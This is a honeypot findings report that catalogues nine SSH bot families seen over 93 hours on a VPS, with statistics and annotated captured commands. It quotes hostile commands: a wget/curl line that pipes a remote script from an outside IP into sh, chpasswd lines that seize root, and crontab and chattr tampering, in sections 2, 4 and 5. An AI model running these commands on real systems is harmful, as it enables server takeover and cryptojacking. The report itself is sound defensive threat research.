# Findings -- 93h live on a public VPS

Helsinki VPS, port 22 redirected to the honeypot. No prior reputation, fresh IP.
Data collected: 2026-05-26 11:32 UTC to 2026-05-30 09:10 UTC.

```
3297 auth attempts
 180 unique source IPs
1928 unique passwords tried
 509 sessions accepted
 880 commands captured
```

---

## What hit us and when

Activity was not continuous -- it came in waves. Two major spikes separated by a
genuine quiet period on 2026-05-28.

```
2026-05-26   88 commands  -- first bots arrive, mixed families
2026-05-27  545 commands  -- Diicot wave, heaviest day
2026-05-28   10 commands  -- quiet period
2026-05-29   90 commands  -- new families appear (C2 dropper, VPS scout)
```

Peak hour: 22:00 UTC (1270 attempts in one hour on 2026-05-27).

Almost all clients identify as `SSH-2.0-Go` -- the scanning ecosystem is almost entirely
built on Go's `golang.org/x/crypto/ssh` library, used directly without OpenSSH. It has
no overhead, no config files, and can open thousands of connections per second.

---

## Attack families

### 1. Credential stuffing (mass scanner)

The baseline of everything. A bot with a wordlist tries every (username, password) pair
against as many servers as possible.

Top passwords seen: `123456`, `admin`, `postgres`, `password`, `1234`, `root`, `test`.
These come from the RockYou wordlist -- 14 million passwords from a 2009 breach that
became the industry standard for this kind of spray.

One bot (`71.227.179.172`) tried 1545 unique passwords. It also ran a sequential numeric
spray: `1` -> `12` -> `123` -> `1234` -> ... -> `123456`. Testing every numeric prefix
on the assumption that some users pick the shortest string that satisfies a length policy.

The Chinese date passwords are interesting: ~80 passwords in the format `YYYYMMDD`
(e.g. `19870825`, `19831215`) mixed with romanized Chinese names (`yangchao`, `wangming`,
`xiaodong`). Dates cluster in the 1982-1991 birth year range. This is a targeted spray
using a dataset from a Chinese data breach -- the bot is not guessing, it's replaying
real credentials from a specific leak.

**Credential feedback loop:** `71.227.179.172` made 1382 more attempts after the first
shell was accepted. The bot doesn't stop when it gets in -- it exhausts the entire
wordlist to find every working credential on the server. The operator is building a
database of `(IP, credential)` pairs, not just gaining access once.

---

### 2. Diicot -- GPU miner dropper

The most active family. ~180 sessions, 545 of 690 commands. Objective: deploy a
Monero cryptocurrency miner on GPU-equipped Linux servers.

Monero is the currency of choice because it is CPU/GPU minable and untraceable. A
compromised server with a GPU generates real income. The bot is selective -- it only
deploys if the hardware is worth the effort.

**The kill chain, step by step:**

```bash
# Step 1 -- OS fingerprint
uname -s -v -n -r -m
uname -m
```
Checks: is this Linux? What kernel? What architecture (x86_64, ARM)?
If not Linux x86_64, the bot exits -- the miner binary only runs there.

```bash
# Step 2 -- CPU and GPU detection
nproc
lspci | egrep VGA && lspci | grep 3D
```
`nproc` counts CPU cores. `lspci` lists hardware on the PCI bus -- GPUs appear as
"VGA compatible controller" or "3D controller". This decides whether it's worth continuing.

Our fake `lspci` output included a Tesla T4 entry. The Tesla T4 is a $2000 NVIDIA
data center GPU. That's exactly what the bot is hunting.

```bash
# Step 3 -- GPU model confirmation
uname -n | awk '{printf $1}'
uname -r | awk '{printf $1}'
nvidia-smi -q | grep "Product Name" | awk '{print $4, $5, $6, $7}' | wc -l | head
nvidia-smi -q | grep "Product Name"
```
`nvidia-smi` is NVIDIA's management tool. The bot parses the exact GPU model and likely
reports it back to a C2 server to calculate expected hash rate and prioritize targets.
Our fake output confirmed a Tesla T4 -- this triggered step 4.

```bash
# Step 4 -- deploy
crontab -r
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
cd /var/tmp
rm -rf /dev/shm/.x /...
```

- `crontab -r` wipes all scheduled jobs, including any persistence set by previous owners
  or competing attackers.
- `chattr -iae ~/.ssh/authorized_keys` is the key move. `chattr` sets filesystem-level
  attributes that sit below normal permissions -- even root cannot modify an immutable file
  without first removing the attribute. The `-i` flag makes the file immutable. Once this
  runs, no other attacker can add their SSH key. The machine is locked to this operator.
- The `rm -rf` kills other miners already running on the machine.

After this the bot would download and run the miner binary. We captured everything up to
that point -- the actual download command was not logged because our fake shell doesn't
implement outbound network calls.

**Why "Diicot":** this malware family was named by security researchers after identifying
it in the wild. The name is a nod to Romania's anti-organized-crime directorate -- a troll
by the malware author, who left Romanian strings in the code.

---

### 3. SCP dropper

One session on 2026-05-26 17:50. Objective: upload a payload binary to the target.

```bash
mkdir /lib/xlxeavrjsw      ; scp -t -r /lib/xlxeavrjsw/
mkdir .qjtfhsqhxjk         ; scp -t -r .qjtfhsqhxjk/
mkdir /dev/lafwbeecslp      ; scp -t -r /dev/lafwbeecslp/
mkdir /dev/shm/omlvyoqxmgd ; scp -t -r /dev/shm/omlvyoqxmgd/
mkdir /var/volatile/...     ; scp -t -r /var/volatile/.../
mkdir /tmp/cygmfsqpwkgd    ; scp -t -r /tmp/cygmfsqpwkgd/
mkdir /sys/tskrwknnyggr    ; scp -t -r /sys/tskrwknnyggr/
mkdir /var/lib/kvpysjxovqw ; scp -t -r /var/lib/kvpysjxovqw/
mkdir /root/xhysbowadep    ; scp -t -r /root/xhysbowadep/
mkdir /etc/nfhqychmmxtl    ; scp -t -r /etc/nfhqychmmxtl/
mkdir /var/log/mvqvifbyeug ; scp -t -r /var/log/mvqvifbyeug/
```

`scp -t` is the server-side SCP receive mode -- the bot is trying to push a file from
its own machine onto ours. It tries 11 directories in sequence, ordered by likelihood
of being writable (`/dev/shm` and `/tmp` are usually world-writable on Linux, while
`/lib` and `/etc` require root).

The 10-character random directory names avoid collision with existing paths.

The honeypot speaks the SCP wire protocol server-side (sends the ready byte, parses
file headers, acks each step), so the bot believed all 11 uploads succeeded. No actual
payload was received -- the file data stream was drained to discard.

---

### 4. Password changer -- exclusivity bot

Four sessions between 2026-05-26 22:xx and 2026-05-27 01:xx.

```bash
uname -a
cat /etc/passwd
passwd
echo 'root:$MWtB6=$e6mK#=E' | chpasswd
```

The bot reads `/etc/passwd` to confirm it has a real Linux system, then changes the
root password. `passwd` is tried first (interactive -- it would ask for the current
password on a real terminal). When that fails, it falls back to `chpasswd`, which reads
`username:password` from stdin and sets the password non-interactively.

Two passwords observed: `i5n#_o$_6qFK!$s` and `$MWtB6=$e6mK#=E`. Both are strong
and clearly machine-generated. The bot does not reuse simple wordlist entries for this --
it generates a unique password so the locked machine is exclusively its.

The logic: the internet is full of bots scanning the same IP ranges. If this bot gets
in, another bot will too within minutes. Changing the root password is a competitive
move -- lock the door so nobody else can use the machine.

---

### 5. C2 dropper -- fileless execution

First appeared 2026-05-29 after switching to `auth-threshold=1`. Multiple source IPs,
same payload. The most dangerous pattern observed.

```bash
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
(wget --no-check-certificate -qO- https://14.46.136.77/sh \
 || curl -sk https://14.46.136.77/sh) | sh -s ssh
```

Three things in one line:

**`uname -a`** -- OS fingerprint. Output is captured by the attacker's C2 server
through the SSH session stream.

**`echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"`** -- hex decodes to `auth_ok\n`.
This is a beacon: a signal to the C2 server that authentication succeeded and a shell
is available. The C2 listens for this string. When it arrives, the IP is marked as
compromised and added to the operator's inventory.

**`wget ... | sh -s ssh`** -- downloads a shell script from `14.46.136.77/sh` and
pipes it directly into `sh`. Nothing is written to disk at any point. The script
executes in memory and exits. Traditional endpoint security tools scan the filesystem
for malicious files -- if there is no file, there is nothing to scan. This technique
is called fileless malware or "living off the land".

The `-s ssh` argument tells the script its entry vector. The same dropper script is
likely reused across web exploits, RCE vulnerabilities, and SSH compromise -- the
entry vector affects what persistence mechanism the script sets up.

`wget` and `curl` are tried in sequence as a fallback -- `wget` is more common on
minimal Linux installs, `curl` on desktop-oriented distributions.

This bot ran via SSH exec channel (not an interactive shell). The exec channel is
SSH's mechanism for running a single command without opening a terminal session.
Faster, cleaner, and invisible to any logging that only watches the interactive shell.
Our original analysis scripts missed every command from this family entirely.

---

### 6. w.sh / astats -- dual persistence bot

First appeared 2026-05-29 14:17 UTC under threshold=1. Hits every ~30-45min from
different IPs -- botnet spray. Most sophisticated persistence in the dataset.

Kill chain:
1. Find writable dir: tries /dev/shm, /tmp, /var/run, /mnt, /root, / in order
2. Drop w.sh to /tmp, chmod +x
3. Cron persistence: adds /tmp/w.sh "astats" "netai" "kstats" to crontab
4. Systemd user service: ~/.config/systemd/user/watcher-netai.service
5. Check if already running: ps aux | grep astats
6. Drop miner binary named astats to /dev/shm or /tmp

Two persistence mechanisms simultaneously -- cron + systemd. If one is removed the
other revives it. Process names (astats, netai, kstats) chosen to look like monitoring
tools in ps aux. Zero sessions before threshold=1 -- confirmed single-shot family.

---

### 7. VPS infrastructure scout

Two sessions: 2026-05-29 09:48 and 14:55. 35 commands per session, no payload deployed.
Objective: assess the machine for deployment suitability.

Covers: identity (id, whoami), user list (/etc/passwd, /etc/shadow), CPU model, distro
detection (which apt/yum/pacman/zypper), network (netstat, ip addr, ss), write permission
test (echo > /tmp/test_XXXX then rm), outbound connectivity (ping 8.8.8.8), running
services (systemctl, ps), disk I/O benchmark (dd bs=1M count=10), shell history.

The dd benchmark is the most telling: the bot measures disk throughput before deciding
to deploy. Ended without payload -- machine failed some criterion (no GPU, wrong distro,
disk too slow) or is a pure probe that reports back to a queue.

---

### 8. SSHCHK -- C2 liveness checker

Two sessions on 2026-05-30 02:20 and 02:23 UTC, different IPs, same tool.

```bash
echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; \
df -P / 2>/dev/null | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
```

The most structured C2 interaction in the dataset. Four components:

**BEGIN/END framing** -- the C2 reads output and extracts everything between the markers.
The random hex token (5718926f9304) is unique per session -- it correlates this output
to this exact connection and prevents replay attacks. A honeypot that cached output
would return a mismatched token and be detected.

**`uname -srm`** -- OS kernel name, release, machine arch in one call. Tighter than
`uname -a` -- only what the C2 needs.

**`echo $((7*191+3))`** -- arithmetic proof-of-work. The shell must evaluate the
expression and return 1340. A static replay returns the wrong number. A broken shell
returns nothing. This confirms a live, working shell before the C2 sends any payload.

**`df -P / | awk 'NR==2{print $1}'`** -- root filesystem device name (/dev/sda1 etc).
Disk presence check -- bare VMs sometimes have unusual layouts.

No follow-up commands after this. The C2 reads the structured output and decides
what to do externally. This bot is a pure inventory probe.

---

### 9. Minimal OS scanner

Two sessions on 2026-05-30 06:03 and 07:39 UTC. SSH-2.0-Go. Different IPs. One command:

```bash
uname -s -m
```

Returns "Linux x86_64". Bot disconnects immediately. Lightest possible post-auth probe --
confirms OS and architecture, exits. Either a cataloguing scanner building an internet
map, or a first-stage probe before a payload bot follows up when conditions are right.

---

## Effect of auth-threshold=1

On 2026-05-29 06:15 UTC the server was redeployed with `auth-threshold=1` -- accept any
password on the first attempt instead of the 10th.

Comparing the 7.7h period before (threshold=10-equivalent) vs the 8.7h period after:

```
                    before    after    delta
attempts              102       83     -19%
unique IPs             12       21     +75%
single-shot IPs         5       12    +140%
accepted                8       83    +938%
commands                6       99   +1550%
```

Single-shot IPs (bots that try exactly once) went from 5 to 12. These were completely
invisible before -- one attempt, rejected, gone. With threshold=1 they get a shell and
reveal their playbook. The C2 dropper and VPS scout families both appeared exclusively
after this change, suggesting they are single-shot bots that give up on the first rejection.

The command count jump (+1550%) confirms the hypothesis: most interesting post-auth
behavior comes from bots that only knock once.

Verified in the logs: the C2 dropper first appeared at 07:56 UTC (1h41m after the
threshold change). The VPS scout first appeared at 09:48 UTC (3h33m after). Neither
family has a single session anywhere in the 68h before the change. This is not a
script fix artifact -- the exec-channel fix applied equally to all periods, so if
these bots had connected earlier their commands would show up in period 4 or 7.
They don't. They are single-shot bots that were silently rejected and left no trace
under the old threshold.

---

## What the honeypot was good at

**The GPU bait worked.** Adding a fake Tesla T4 to the `lspci` output caused Diicot
sessions to progress from step 2 (GPU check) all the way to step 4 (kill chain). Without
bait, those sessions would have exited at "no GPU found". The bait revealed the full
deployment sequence.

**The SCP handler kept bots engaged.** Speaking the SCP wire protocol server-side
meant the dropper bot ran all 11 upload attempts instead of dying on the first rejected
connection. We got the full directory priority list.

**Returning exit 0 everywhere** kept bots progressing through their playbook.
`chpasswd`, `crontab -r`, `chattr` all returned success. A real failure code would
cause most bots to abort early.

## What we missed

**The C2 dropper payload.** The script at `14.46.136.77/sh` was piped into sh and
executed. Since our fake shell cannot make real outbound HTTP requests, we captured
the command but not the script content. A fake `wget`/`curl` that logs the URL and
returns controlled content would capture the payload.

**Exec channel commands in the first analysis pass.** The analysis scripts only counted
interactive shell commands (`msg=shell`) and missed every exec-channel command
(`msg=exec`). The "0 commands" numbers reported for several periods were wrong.
Fixed after discovering 679 exec commands that had been invisible.
